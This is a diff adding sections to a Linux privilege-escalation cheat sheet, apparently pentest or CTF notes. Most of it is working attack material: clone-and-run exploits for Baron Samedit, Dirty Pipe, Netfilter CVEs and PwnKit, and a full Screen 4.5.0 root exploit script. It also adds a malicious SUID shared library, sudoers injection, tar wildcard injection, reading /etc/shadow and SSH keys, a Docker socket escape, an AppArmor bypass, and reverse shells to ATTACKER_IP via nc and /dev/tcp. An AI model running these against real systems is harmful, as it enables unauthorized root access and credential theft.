@@ -52,6 +52,65 @@ searchsploit linux kernel 3.9
 
 * To remove DoS exploits by adding -exclude=”/dos/”
 
+#### Identifying Password Hash Algorithms
+
+| Algorithm | Hash Prefix |
+|-----------|-------------|
+| Salted MD5 | `$1$`... |
+| SHA-256 | `$5$`... |
+| SHA-512 | `$6$`... |
+| BCrypt | `$2a$`... |
+| Scrypt | `$7$`... |
+| Argon2 | `$argon2i$`... |
+
+#### Users with Login Shells
+
+```bash
+grep "sh$" /etc/passwd
+```
+
+#### Defenses in Place
+
+Check for: AppArmor, SELinux, Fail2ban, iptables, ufw, Snort, Exec Shield.
+
+```bash
+cat /etc/apparmor.d/* 2>/dev/null
+sestatus 2>/dev/null
+```
+
+#### Hidden Files and Directories
+
+```bash
+find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
+find / -type d -name ".*" -ls 2>/dev/null
+```
+
+#### Finding History Files
+
+```bash
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+```
+
+#### Finding Config Files
+
+```bash
+find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+```
+
+#### Finding Scripts
+
+```bash
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+```
+
+#### Comparing Installed Packages to GTFObins
+
+```bash
+for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
+```
+
+Requires creating a package list first: `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list`
+
 #### Binaries Owned by the root user
 
 * Always run with `-p` so it preserves permissions for the root user!!!!
@@ -162,6 +221,13 @@ find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -ex
 
 ```
 find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
+```
+
+* Quick writable directory/file checks:
+
+```bash
+find / -type d -writable 2>/dev/null
+find / -type f -writable 2>/dev/null | grep -v "/proc"
 ```
 
 ### Automated enumeration and exploit tools
@@ -403,6 +469,126 @@ Sudoers I/O plugin version 1.8.27
 sudo -u#-1 /bin/bash
 root@NIX04:/home/ben# 
 ```
+
+### CVE-2021-3156 - Sudo Baron Samedit (Heap Buffer Overflow)
+
+Affects sudo versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1. Hidden for over ten years before discovery.
+
+**Affected versions:**
+- 1.8.31 — Ubuntu 20.04
+- 1.8.27 — Debian 10
+- 1.9.2 — Fedora 33
+
+```bash
+sudo -V | head -n1
+# Sudo version 1.8.31
+
+# Clone and compile
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+make
+
+# List available targets
+./sudo-hax-me-a-sandwich
+# 0) Ubuntu 18.04.5 - sudo 1.8.21, libc-2.27
+# 1) Ubuntu 20.04.1 - sudo 1.8.31, libc-2.31
+# 2) Debian 10.0 - sudo 1.8.27, libc-2.28
+
+# Check OS version
+cat /etc/lsb-release
+
+# Run with target ID
+./sudo-hax-me-a-sandwich 1
+# uid=0(root) gid=0(root)
+```
+
+---
+
+### CVE-2022-0847 - Dirty Pipe
+
+Affects Linux kernels 5.8 through 5.17. Allows unauthorized writing to root user files as long as you have read access. Also affects Android phones.
+
+```bash
+uname -r
+# 5.13.0-46-generic
+
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+```
+
+**exploit-1** — modifies `/etc/passwd` and gives a root prompt:
+
+```bash
+./exploit-1
+# Backing up /etc/passwd to /tmp/passwd.bak ...
+# Setting root password to "piped"...
+# uid=0(root) gid=0(root)
+```
+
+**exploit-2** — runs any SUID binary with root privileges:
+
+```bash
+find / -perm -4000 2>/dev/null
+./exploit-2 /usr/bin/sudo
+# uid=0(root) gid=0(root)
+```
+
+---
+
+### Netfilter Kernel Exploits
+
+Netfilter is the Linux kernel packet filtering module (`iptables`). Multiple kernel exploits exist for it.
+
+**CVE-2021-22555** — Vulnerable kernel versions 2.6 through 5.11:
+
+```bash
+uname -r
+# 5.10.5-051005-generic
+
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+gcc -m32 -static exploit.c -o exploit
+./exploit
+# uid=0(root) gid=0(root)
+```
+
+**CVE-2022-25636** — Affects kernel 5.4 through 5.6.10 (`net/netfilter/nf_dup_netdev.c`). Can corrupt the kernel — reboot may be required:
+
+```bash
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+cd CVE-2022-25636
+make
+./exploit
+# uid=0(root) gid=0(root)
+```
+
+**CVE-2023-32233** — Use-After-Free in `nf_tables` anonymous sets. Kernel up to 6.3.1:
+
+```bash
+git clone https://github.com/Liuk3r/CVE-2023-32233
+cd CVE-2023-32233
+gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+./exploit
+# uid=0(root) gid=0(root)
+```
+
+Kernel exploits are unstable — use with caution on production systems.
+
+---
+
+### CVE-2021-4034 - PwnKit (Polkit pkexec)
+
+Memory corruption in `pkexec` — affects all polkit installations. Hidden for over ten years.
+
+```bash
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+./poc
+# uid=0(root) gid=0(root)
+```
+
+---
 
 ### CVE-2025-32463 - Sudo --chroot Privilege Escalation
 
@@ -1157,10 +1343,12 @@ chmod +x /home/user/shell.elf
 
 * Create these two files in /home/user:
 
+```bash
+echo "" > "/home/user/--checkpoint=1"
+echo "" > "/home/user/--checkpoint-action=exec=shell.elf"
 ```
-touch /home/user/--checkpoint=1
-touch /home/user/--checkpoint-action=exec=shell.elf
-```
+
+`touch` will not work here — it treats `--checkpoint` as its own flag. Use `echo "" >` with the filename quoted instead.
 
 * When the tar command in the cron job runs, the wildcard (\*) will expand to include these files.
 * Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
@@ -1172,10 +1360,10 @@ nc -nvlp 4444
 
 #### CronJobs - Wildcards No msfvenom
 
-```
+```bash
 echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > /home/user/runme.sh
-touch /home/user/--checkpoint=1
-touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+echo "" > "/home/user/--checkpoint=1"
+echo "" > "/home/user/--checkpoint-action=exec=sh runme.sh"
 ```
 
 * Wait the 1 minute or time defined by cron settings
@@ -1244,6 +1432,47 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 ```
 
 * It will be an euid=0 not a uid=0!!!
+
+#### SUID-Shared Object Hijacking via RUNPATH
+
+If a SUID binary has a custom `RUNPATH` pointing to a writable directory, you can place a malicious shared library there.
+
+```bash
+# Check RUNPATH
+readelf -d /path/to/suid_binary | grep PATH
+# 0x000000000000001d (RUNPATH)  Library runpath: [/development]
+
+# Check if the directory is writable
+ls -la /development/
+
+# Find the function name the binary expects
+ldd /path/to/suid_binary
+# libshared.so => /development/libshared.so
+
+cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+./suid_binary
+# symbol lookup error: undefined symbol: dbquery
+```
+
+Create a malicious library matching the expected function:
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+```
+
+```bash
+gcc src.c -fPIC -shared -o /development/libshared.so
+./suid_binary
+# uid=0(root)
+```
 
 ### SUID and SGID Environment Variables
 
@@ -1347,6 +1576,39 @@ Run the `/tmp/rootbash` executable with -p to gain a shell running with root pri
 ```
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
 ```
+
+### PATH Abuse
+
+If a SUID binary or cron job calls a command without its absolute path, you can hijack it by placing a malicious binary earlier in the PATH.
+
+Add the current directory to PATH:
+
+```bash
+PATH=.:${PATH}
+export PATH
+echo $PATH
+```
+
+Create a fake binary that replaces a command the target script calls (e.g., if a SUID binary calls `service`):
+
+```bash
+echo '/bin/bash -p' > /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+# Run the vulnerable SUID binary — it calls "service" which now runs your script
+```
+
+Alternatively, write the sudoers file:
+
+```bash
+echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+```
+
+After the vulnerable binary runs, check with `sudo -l` and then `sudo su`.
+
+---
 
 ### NFS
 
@@ -1809,6 +2071,43 @@ os.system('cp /root/.ssh/id_rsa /tmp/rootkey && chmod 644 /tmp/rootkey')
 
 **Reference:** https://gtfobins.github.io/gtfobins/dstat/
 
+### Sudo tcpdump Privilege Escalation
+
+If `sudo -l` shows `(root) NOPASSWD: /usr/sbin/tcpdump`, abuse the `-z postrotate-command` option to execute arbitrary scripts as root.
+
+```bash
+# Create reverse shell payload
+cat > /tmp/.privesc << 'EOF'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f
+EOF
+chmod +x /tmp/.privesc
+
+# Start listener on attacker
+nc -lnvp 443
+
+# Execute tcpdump with postrotate-command
+sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.privesc -Z root
+```
+
+AppArmor in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing this.
+
+---
+
+### Privileged Groups — Disk
+
+Users in the `disk` group have full access to block devices in `/dev` (e.g., `/dev/sda1`). Use `debugfs` to read the entire filesystem as root:
+
+```bash
+id
+# uid=1000(user) gid=1000(user) groups=1000(user),6(disk)
+
+debugfs /dev/sda1
+debugfs: cat /root/.ssh/id_rsa
+debugfs: cat /etc/shadow
+```
+
+---
+
 ### Docker Container Detection & Enumeration
 
 **Detect if you're in a container:**
@@ -1896,6 +2195,41 @@ chmod +s /var/www/html/survey/bash
 ```
 
 **Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/
+
+---
+
+### Docker Socket Escalation (from inside container)
+
+If you find a Docker socket (`docker.sock`) inside a container, you can use it to create a new privileged container with the host filesystem mounted.
+
+```bash
+# Find the socket
+ls -al /app/
+# srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
+
+# Download docker binary if not installed
+wget https://master.dockerproject.com/linux/x86_64/docker -O /tmp/docker
+chmod +x /tmp/docker
+
+# List running containers
+/tmp/docker -H unix:///app/docker.sock ps
+
+# Create a new container mounting the host root filesystem
+/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+
+# Exec into the new container
+/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
+
+# Access host files
+cat /hostsystem/root/.ssh/id_rsa
+```
+
+From the host (non-container), if the Docker socket is writable:
+
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+# uid=0(root)
+```
 
 ---
 
@@ -2084,10 +2418,50 @@ lxd init
 
 ### Capabilities
 
-* Search your whole file-system recursively with the following command:
+Capabilities grant fine-grained privileges to binaries without full root access. Key dangerous capabilities:
 
-```
+| Capability | Risk |
+|-----------|------|
+| `cap_setuid` | Set effective UID — become root |
+| `cap_setgid` | Set effective GID — become root group |
+| `cap_dac_override` | Bypass file read/write/execute permission checks |
+| `cap_sys_admin` | Broad admin privileges (mount, syslog, etc.) |
+| `cap_sys_ptrace` | Attach to and debug other processes |
+| `cap_sys_module` | Load/unload kernel modules |
+| `cap_net_bind_service` | Bind to privileged ports (<1024) |
+
+| Capability Value | Meaning |
+|-----------------|---------|
+| `=` | Clear a previously set capability |
+| `+ep` | Grant effective and permitted privileges |
+| `+ei` | Grant effective and inheritable privileges |
+| `+p` | Grant permitted only (no inherit) |
+
+Search your whole file-system recursively:
+
+```bash
 getcap -r / 2>/dev/null
+```
+
+Targeted search of common binary directories:
+
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+#### cap_dac_override (vim)
+
+If `vim` has `cap_dac_override=eip`, it can read/write any file regardless of permissions. Remove the root password from `/etc/passwd`:
+
+```bash
+getcap /usr/bin/vim.basic
+# /usr/bin/vim.basic cap_dac_override=eip
+
+# Non-interactive — strip the 'x' from root's password field
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+
+# Now switch to root without a password
+su root
 ```
 
 #### Python
@@ -2115,14 +2489,16 @@ which perl
 * Looking for:
 
 ```
-/home/demo/python3 = cap_setuid+ep
+/usr/bin/perl = cap_setuid+ep
 ```
 
 * Escalate
 
 ```
-./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
+
+If the command runs but you still can't access `/root` or `/etc/shadow`, check for AppArmor restrictions — see the [AppArmor](#apparmor) section below.
 
 #### Tar
 
@@ -2525,3 +2901,182 @@ ls -la /tmp/rootshell
 ```
 
 **Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
+
+---
+
+### Screen 4.5.0 Privilege Escalation
+
+Screen version 4.05.00 has a SUID-based local root exploit that abuses `ld.so.preload` overwriting.
+
+```bash
+screen -v
+# Screen version 4.05.00 (GNU) 10-Dec-16
+```
+
+**Exploit script (screenroot.sh):**
+
+```bash
+#!/bin/bash
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+echo "[+] Triggering..."
+screen -ls
+/tmp/rootshell
+```
+
+---
+
+### Logrotate Exploitation (logrotten)
+
+If you have write permissions on log files and logrotate runs as root, you can exploit vulnerable versions (3.8.6, 3.11.0, 3.15.0, 3.18.0) using [logrotten](https://github.com/whotwagner/logrotten).
+
+**Requirements:**
+1. Write permissions on the log files
+2. Logrotate runs as root
+3. Vulnerable logrotate version
+
+```bash
+# Compile
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+
+# Create payload
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1' > payload
+
+# Check which option logrotate uses
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+
+# Start listener on attacker
+nc -nlvp 9001
+
+# Run exploit (use -c for "create" option, -d for "compress")
+./logrotten -p ./payload /tmp/tmp.log
+```
+
+---
+
+### Tmux Session Hijacking
+
+If a privileged user left a tmux session running with weak permissions, you can attach to it and gain their privileges.
+
+```bash
+# Check for running tmux processes
+ps aux | grep tmux
+# root  4806  0.0  0.1  29416  3204 ?  Ss  06:27  0:00 tmux -S /shareds new -s debugsess
+
+# Confirm socket permissions
+ls -la /shareds
+# srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds
+
+# Verify your group membership includes the socket's group
+id
+# uid=1000(user) gid=1000(user) groups=1000(user),1011(devs)
+
+# Attach to the session
+tmux -S /shareds
+# uid=0(root) gid=0(root)
+```
+
+---
+
+## AppArmor
+
+AppArmor is a Linux kernel security module that restricts what individual programs can do (file access, network, capabilities). Even if a binary has `cap_setuid+ep`, an AppArmor profile can deny access to sensitive paths.
+
+### Detection
+
+```bash
+ls -la /etc/apparmor.d/
+cat /etc/apparmor.d/usr.bin.perl
+```
+
+### Profile Flags
+
+| Flag | Meaning |
+|------|---------|
+| `m` | Allow memory-mapping the file |
+| `r` | Read |
+| `w` | Write |
+| `i` | Inherit profile on exec (child stays confined) |
+| `x` | Execute |
+
+Example profile restricting Perl:
+
+```
+/usr/bin/perl {
+  #include <abstractions/base>
+  #include <abstractions/nameservice>
+  #include <abstractions/perl>
+
+  capability setuid,
+
+  deny owner /etc/nsswitch.conf r,
+  deny /root/* rwx,
+  deny /etc/shadow rwx,
+
+  /usr/bin/id mrix,
+  /usr/bin/ls mrix,
+  /usr/bin/cat mrix,
+  /usr/bin/whoami mrix,
+  /opt/backup.pl mrix,
+  owner /home/ r,
+  owner /home/david/ r,
+}
+```
+
+This grants `setuid` capability but denies access to `/root/*` and `/etc/shadow`, and only allows execution of a handful of binaries.
+
+### Shebang Bypass
+
+AppArmor enforces profiles when a binary is called directly (e.g. `/usr/bin/perl -e '...'`), but does **not** apply the profile when the binary is invoked via a shebang (`#!`) in an executable script.
+
+```bash
+# Calling perl directly — AppArmor ENFORCED:
+/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "cat /root/root.txt";'
+# Permission denied
+
+# Via shebang — AppArmor BYPASSED:
+cat /tmp/privesc.pl
+#!/usr/bin/perl
+use POSIX (setuid);
+POSIX::setuid(0);
+exec "/bin/sh";
+
+chmod +x /tmp/privesc.pl
+/tmp/privesc.pl
+# uid=0(root)
+```
+
+This works because when Linux loads an executable script with `#!/usr/bin/perl`, the AppArmor profile for `/usr/bin/perl` is not applied to that execution context.
